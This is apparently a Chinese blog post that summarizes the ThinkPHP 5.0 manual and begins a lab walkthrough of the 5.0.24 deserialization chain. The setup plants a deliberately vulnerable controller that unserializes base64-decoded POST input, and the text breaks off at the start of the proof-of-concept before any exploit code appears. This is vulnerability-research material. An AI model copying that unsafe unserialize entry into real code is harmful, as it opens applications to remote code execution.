+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace second\test1;</span><br><span class="line">require(&quot;test.php&quot;);</span><br><span class="line">use first\test\test;</span><br><span class="line">trait test1&#123;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo &quot;tostring\n&quot;;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new test();</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="ThinkPHP开发手册"><a href="#ThinkPHP开发手册" class="headerlink" title="ThinkPHP开发手册"></a>ThinkPHP开发手册</h2><p>官方文档：<a target="_blank" rel="noopener" href="https://www.thinkphp.cn/doc">https://www.thinkphp.cn/doc</a></p>
+<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h4><p><strong>函数和类、属性命名</strong></p>
+<ul>
+<li>类的命名采用驼峰法（首字母大写），例如 <code>User</code>、<code>UserType</code>，默认不需要添加后缀，例如<code>UserController</code>应该直接命名为<code>User</code>；</li>
+<li>函数的命名使用小写字母和下划线（小写字母开头）的方式，例如 <code>get_client_ip</code>；</li>
+<li>方法的命名使用驼峰法（首字母小写），例如 <code>getUserName</code>；</li>
+<li>属性的命名使用驼峰法（首字母小写），例如 <code>tableName</code>、<code>instance</code>；</li>
+<li>以双下划线“__”打头的函数或方法作为魔术方法，例如 <code>__call</code> 和 <code>__autoload</code>；</li>
+</ul>
+<p><strong>常量和配置</strong></p>
+<ul>
+<li>常量以大写字母和下划线命名，例如 <code>APP_PATH</code>和 <code>THINK_PATH</code>；</li>
+<li>配置参数以小写字母和下划线命名，例如 <code>url_route_on</code> 和<code>url_convert</code>；</li>
+</ul>
+<h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><p>可以在README.md查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">www  WEB部署目录（或者子目录）</span><br><span class="line">├─application           应用目录</span><br><span class="line">│  ├─common             公共模块目录（可以更改）</span><br><span class="line">│  ├─module_name        模块目录</span><br><span class="line">│  │  ├─config.php      模块配置文件</span><br><span class="line">│  │  ├─common.php      模块函数文件</span><br><span class="line">│  │  ├─controller      控制器目录</span><br><span class="line">│  │  ├─model           模型目录</span><br><span class="line">│  │  ├─view            视图目录</span><br><span class="line">│  │  └─ ...            更多类库目录</span><br><span class="line">│  │</span><br><span class="line">│  ├─command.php        命令行工具配置文件</span><br><span class="line">│  ├─common.php         公共函数文件</span><br><span class="line">│  ├─config.php         公共配置文件</span><br><span class="line">│  ├─route.php          路由配置文件</span><br><span class="line">│  ├─tags.php           应用行为扩展定义文件</span><br><span class="line">│  └─database.php       数据库配置文件</span><br><span class="line">│</span><br><span class="line">├─public                WEB目录（对外访问目录）</span><br><span class="line">│  ├─index.php          入口文件</span><br><span class="line">│  ├─router.php         快速测试文件</span><br><span class="line">│  └─.htaccess          用于apache的重写</span><br><span class="line">│</span><br><span class="line">├─thinkphp              框架系统目录</span><br><span class="line">│  ├─lang               语言文件目录</span><br><span class="line">│  ├─library            框架类库目录</span><br><span class="line">│  │  ├─think           Think类库包目录</span><br><span class="line">│  │  └─traits          系统Trait目录</span><br><span class="line">│  │</span><br><span class="line">│  ├─tpl                系统模板目录</span><br><span class="line">│  ├─base.php           基础定义文件</span><br><span class="line">│  ├─console.php        控制台入口文件</span><br><span class="line">│  ├─convention.php     框架惯例配置文件</span><br><span class="line">│  ├─helper.php         助手函数文件</span><br><span class="line">│  ├─phpunit.xml        phpunit配置文件</span><br><span class="line">│  └─start.php          框架入口文件</span><br><span class="line">│</span><br><span class="line">├─extend                扩展类库目录</span><br><span class="line">├─runtime               应用的运行时目录（可写，可定制）</span><br><span class="line">├─vendor                第三方类库目录（Composer依赖库）</span><br><span class="line">├─build.php             自动生成定义文件（参考）</span><br><span class="line">├─composer.json         composer 定义文件</span><br><span class="line">├─LICENSE.txt           授权说明文件</span><br><span class="line">├─README.md             README 文件</span><br><span class="line">├─think                 命令行入口文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><p><code>ThinkPHP5.0</code>应用基于<code>MVC</code>（模型-视图-控制器）的方式来组织，我们首先要了解一下几个概念</p>
+<p><strong>入口文件</strong></p>
+<p>用户请求的PHP文件，负责处理一个请求（注意，不一定是URL请求）的生命周期，最常见的入口文件就是<code>index.php</code>，有时候也会为了某些特殊的需求而增加新的入口文件，例如给后台模块单独设置的一个入口文件<code>admin.php</code>或者一个控制器程序入口<code>think</code>都属于入口文件。</p>
+<p><strong>应用</strong></p>
+<p>应用在<code>ThinkPHP</code>中是一个管理系统架构及生命周期的对象，由系统的 <code>\think\App</code>类完成，应用通常在入口文件中被调用和执行，具有相同的应用目录（<code>APP_PATH</code>）的应用我们认为是同一个应用，但一个应用可能存在多个入口文件。</p>
+<p>应用具有自己独立的配置文件、公共（函数）文件。</p>
+<p><strong>模块</strong></p>
+<p>一个典型的应用是由多个模块组成的，这些模块通常都是应用目录下面的一个子目录，每个模块都有自己独立的配置文件、公共文件和类库文件。</p>
+<p>5.0支持单一模块架构设计，如果你的应用下面只有一个模块，那么这个模块的子目录是可以省略，并且在应用配置文件中修改<code>&#39;app_multi_module&#39; =&gt;	false</code></p>
+<p><strong>控制器</strong></p>
+<p>每个模块拥有独立的<code>MVC</code>类库及配置文件，一个模块下面有多个控制器负责响应请求，而每个控制器其实就是一个独立的控制器类。控制器主要负责请求的接收，并调用相关的模型处理，并最终通过视图输出。</p>
+<p>5.0的控制器类比较灵活，可以无需继承任何基础类库。一个典型的<code>Index</code>控制器类如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,thinkphp!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>操作</strong></p>
+<p>一个控制器包含多个操作（方法），操作方法是一个URL访问的最小单元。</p>
+<p>下面是一个典型的<code>Index</code>控制器的操作方法定义，包含了两个操作方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hello,&#x27;</span>.<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>操作方法可以不使用任何参数，如果定义了一个非可选参数，则该参数必须通过用户请求传入，如果是URL请求，则通常是<code>$_GET</code>或者<code>$_POST</code>方式传入。</p>
+<h4 id="URL访问"><a href="#URL访问" class="headerlink" title="URL访问"></a>URL访问</h4><p><strong>URL设计</strong></p>
+<p>ThinkPHP<code>5.0</code>在没有启用路由的情况下典型的URL访问规则是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://thinkphp5/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</span><br></pre></td></tr></table></figure>
+
+<p>采用的是<code>PATH_INFO</code>访问地址，其中<code>PATH_INFO</code>的分隔符是可以设置的。</p>
+<p>如果不支持<code>PATH_INFO</code>的服务器可以使用兼容模式访问如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</span><br></pre></td></tr></table></figure>
+
+<p>必要的时候，我们可以通过某种方式，省略URL里面的模块和控制器。</p>
+<p><strong>URL大小写</strong></p>
+<p>默认情况下，<code>URL</code>是不区分大小写的，也就是说 <code>URL</code>里面的<strong>模块&#x2F;控制器&#x2F;操作名</strong>会自动转换为小写，控制器在最后调用的时候会转换为驼峰法处理。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php/Index/Blog/read</span><br><span class="line">// 和下面的访问是等效的</span><br><span class="line">http://localhost/index.php/index/blog/read</span><br></pre></td></tr></table></figure>
+
+<p>如果访问下面的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php/Index/BlogTest/read</span><br><span class="line">// 和下面的访问是等效的</span><br><span class="line">http://localhost/index.php/index/blogtest/read</span><br></pre></td></tr></table></figure>
+
+<p>在这种URL不区分大小写情况下，如果要访问驼峰法的控制器类（即控制器blog的test类），则需要使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php/Index/blog_test/read</span><br></pre></td></tr></table></figure>
+
+<p>注：模块名和操作名会直接转换为小写处理。</p>
+<h4 id="模块设计"><a href="#模块设计" class="headerlink" title="模块设计"></a>模块设计</h4><p><strong>目录结构</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">├─application           应用目录（可设置）</span><br><span class="line">│  ├─common             公共模块目录（可选）</span><br><span class="line">│  ├─common.php         公共函数文件</span><br><span class="line">│  ├─route.php          路由配置文件</span><br><span class="line">│  ├─database.php       数据库配置文件</span><br><span class="line">│  ├─config.php         应用配置文件</span><br><span class="line">│  ├─module1            模块1目录</span><br><span class="line">│  │  ├─config.php      模块配置文件</span><br><span class="line">│  │  ├─common.php      模块函数文件</span><br><span class="line">│  │  ├─controller      控制器目录</span><br><span class="line">│  │  ├─model           模型目录（可选）</span><br><span class="line">│  │  ├─view            视图目录（可选）</span><br><span class="line">│  │  └─ ...            更多类库目录</span><br><span class="line">│  │ </span><br><span class="line">│  ├─module2            模块2目录</span><br><span class="line">│  │  ├─config.php      模块配置文件</span><br><span class="line">│  │  ├─common.php      模块函数文件</span><br><span class="line">│  │  ├─controller      控制器目录</span><br><span class="line">│  │  ├─model           模型目录（可选）</span><br><span class="line">│  │  ├─view            视图目录（可选）</span><br><span class="line">│  │  └─ ...            更多类库目录</span><br></pre></td></tr></table></figure>
+
+<p>遵循ThinkPHP<code>5.0</code>的命名规范，模块目录全部采用<strong>小写和下划线</strong>命名。</p>
+<p>其中<code>common</code>模块是一个特殊的模块，默认是禁止直接访问的，一般用于放置一些公共的类库用于其他模块的继承。</p>
+<p><strong>模块类库</strong></p>
+<p>一个模块下面的类库文件的命名空间统一以<code>app\模块名</code>开头，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// index模块的Index控制器类</span><br><span class="line">app\index\controller\Index</span><br><span class="line">// index模块的User模型类</span><br><span class="line">app\index\model\User</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>app</code>可以通过定义的方式更改，例如我们在应用配置文件中修改：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;app_namespace&#x27; =&gt; &#x27;application&#x27;,</span><br></pre></td></tr></table></figure>
+
+<p>那么，index模块的类库命名空间则变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// index模块的Index控制器类</span><br><span class="line">application\index\controller\Index</span><br><span class="line">// index模块的User模型类</span><br><span class="line">application\index\model\User</span><br></pre></td></tr></table></figure>
+
+<p>命名空间相关内容可以参考前文的前置知识</p>
+<p><strong>单一模块</strong></p>
+<p>如果你的应用比较简单，只有唯一一个模块，那么可以进一步简化成使用单一模块结构，方法如下：</p>
+<p>首先在应用配置文件中定义：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 关闭多模块设计</span><br><span class="line">&#x27;app_multi_module&#x27;  =&gt;  false,</span><br></pre></td></tr></table></figure>
+
+<p>然后，调整应用目录的结构为如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">├─application        应用目录（可设置）</span><br><span class="line">│  ├─controller      控制器目录</span><br><span class="line">│  ├─model           模型目录</span><br><span class="line">│  ├─view            视图目录</span><br><span class="line">│  ├─ ...            更多类库目录</span><br><span class="line">│  ├─common.php      函数文件</span><br><span class="line">│  ├─route.php       路由配置文件</span><br><span class="line">│  ├─database.php    数据库配置文件</span><br><span class="line">│  └─config.php      配置文件</span><br></pre></td></tr></table></figure>
+
+<p>URL访问地址变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://serverName/index.php（或者其它应用入口）/控制器/操作/[参数名/参数值...]</span><br></pre></td></tr></table></figure>
+
+<p>同时，单一模块设计下的应用类库的命名空间也有所调整，例如：</p>
+<p>原来的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app\index\controller\Index</span><br><span class="line">app\index\model\User</span><br></pre></td></tr></table></figure>
+
+<p>变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app\controller\Index</span><br><span class="line">app\model\User</span><br></pre></td></tr></table></figure>
+
+<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="配置格式"><a href="#配置格式" class="headerlink" title="配置格式"></a>配置格式</h4><p>ThinkPHP框架中默认所有配置文件的定义格式均采用返回<strong>PHP数组</strong>的方式</p>
+<p>格式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//项目配置文件</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;DEFAULT_MODULE&#x27;</span>     =&gt; <span class="string">&#x27;Index&#x27;</span>, <span class="comment">//默认模块</span></span><br><span class="line">    <span class="string">&#x27;URL_MODEL&#x27;</span>          =&gt; <span class="string">&#x27;2&#x27;</span>, <span class="comment">//URL模式</span></span><br><span class="line">    <span class="string">&#x27;SESSION_AUTO_START&#x27;</span> =&gt; <span class="literal">true</span>, <span class="comment">//是否开启session</span></span><br><span class="line">    <span class="comment">//更多配置参数</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>注：二级参数配置区分大小写</p>
+<h4 id="配置加载"><a href="#配置加载" class="headerlink" title="配置加载"></a>配置加载</h4><p>在ThinkPHP中，一般来说应用的配置文件是自动加载的，加载的顺序是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">惯例配置-&gt;应用配置-&gt;模式配置-&gt;调试配置-&gt;状态配置-&gt;模块配置-&gt;扩展配置-&gt;动态配置</span><br></pre></td></tr></table></figure>
+
+<p>以上是配置文件的加载顺序，因为后面的配置会覆盖之前的同名配置（在没有生效的前提下），所以配置的优先顺序从右到左。</p>
+<p>主要的配置：</p>
+<ul>
+<li><p>惯例配置：ThinkPHP&#x2F;Conf&#x2F;convention.php</p>
+<p>按照大多数的使用对常用参数进行了默认配置</p>
+</li>
+<li><p>应用配置：Application&#x2F;Common&#x2F;Conf&#x2F;config.php</p>
+<p>调用所有模块之前都会首先加载的公共配置文件</p>
+</li>
+<li><p>模块配置：Application&#x2F;当前模块名&#x2F;Conf&#x2F;config.php</p>
+<p>每个模块会自动加载自己的配置文件</p>
+</li>
+<li><p>动态配置：在具体的操作方法里面，对某些参数进行动态配置</p>
+<p><code>C(&#39;参数名称&#39;,&#39;新的参数值&#39;)</code></p>
+</li>
+</ul>
+<h4 id="读取配置"><a href="#读取配置" class="headerlink" title="读取配置"></a>读取配置</h4><p>无论何种配置文件，定义了配置文件之后，都会统一使用系统提供的C方法（config）来读取已有的配置，这个方法可以在任何地方读取任何配置</p>
+<p>用法：<code>C(&#39;参数名称&#39;)</code></p>
+<p>例如，读取当前的URL模式配置参数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$model</span> = <span class="title function_ invoke__">C</span>(<span class="string">&#x27;URL_MODEL&#x27;</span>);</span><br><span class="line"><span class="comment">// 由于配置参数不区分大小写，因此下面的写法是等效的</span></span><br><span class="line"><span class="comment">// $model = C(&#x27;url_model&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>注：配置参数名称中不能含有 “.” 和特殊字符，允许字母、数字和下划线</p>
+<h4 id="扩展配置"><a href="#扩展配置" class="headerlink" title="扩展配置"></a>扩展配置</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加载扩展配置文件</span></span><br><span class="line"><span class="string">&#x27;LOAD_EXT_CONFIG&#x27;</span> =&gt; <span class="string">&#x27;user,db&#x27;</span>, </span><br></pre></td></tr></table></figure>
+
+<p>假设<code>user.php</code> 和<code>db.php</code>分别用于用户配置和数据库配置</p>
+<p>其中公共配置的加载在<code>Application/Common/Conf/user.php</code>和<code>Application/Common/Conf/db.php</code></p>
+<h3 id="框架引导start-php"><a href="#框架引导start-php" class="headerlink" title="框架引导start.php"></a>框架引导start.php</h3><p>thinkphp为单程序入口，这是 mvc 框架的特征，程序的入口在public目录下的index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义应用目录</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;APP_PATH&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../application/&#x27;</span>);</span><br><span class="line"><span class="comment">// 加载框架引导文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../thinkphp/start.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>require</code>引入 thinkphp 的<code>start.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ThinkPHP 引导文件</span></span><br><span class="line"><span class="comment">// 1. 加载基础文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/base.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 执行应用</span></span><br><span class="line"><span class="title class_">App</span>::<span class="title function_ invoke__">run</span>()-&gt;<span class="title function_ invoke__">send</span>();</span><br></pre></td></tr></table></figure>
+
+<p>跟进到base.php，在<code>base.php(thinkphp/base.php)</code>中定义了一些常量，比如<code>ROOT_PATH</code>、<code>RUNTIME_PATH</code>、<code>LOG_PATH</code>等等，然后引入<code>Loader</code>类来自动加载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">位于thinkphp/base.php:38</span><br><span class="line">require CORE_PATH . &#x27;Loader.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>然后在下面通过<code>.env</code>文件 putenv 环境变量，接下来都是加载一些配置文件</p>
+<p>最后配置完返回 <code>thinkphp/start.php</code> 启动程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//执行应用</span><br><span class="line">App::run()-&gt;send();</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="ThinkPHP5-0-x反序列化链"><a href="#ThinkPHP5-0-x反序列化链" class="headerlink" title="ThinkPHP5.0.x反序列化链"></a>ThinkPHP5.0.x反序列化链</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><code>thinkphp5.0.24</code>源码下载链接：<a target="_blank" rel="noopener" href="http://m.lxywzjs.com/wap/article/index/artid/200.html">http://m.lxywzjs.com/wap/article/index/artid/200.html</a></p>
+<p>这里选择的是phpstudy上搭建，版本为<code>PHP7.34+Xdebug+thinkphp5.0.24</code></p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240618224916921.png"></p>
+<p>创建好网站后，我们要准备一个二次反序列化入口</p>
+<p>修改<code>application\index\controller\Index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;       </span><br><span class="line">        <span class="variable">$payload</span>=<span class="variable">$_POST</span>[<span class="string">&quot;payload&quot;</span>];</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$payload</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后就是修改compose.json为5.0.24以及php版本</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708195557785.png"></p>
+<p>修改好上述内容后把下载好的文件夹内所有内容放到刚刚搭建网站的根目录</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240707123532191.png"></p>
+<p>启动web服务访问<code>/public</code>，若出现以下界面说明搭建成功</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240707123819033.png"></p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 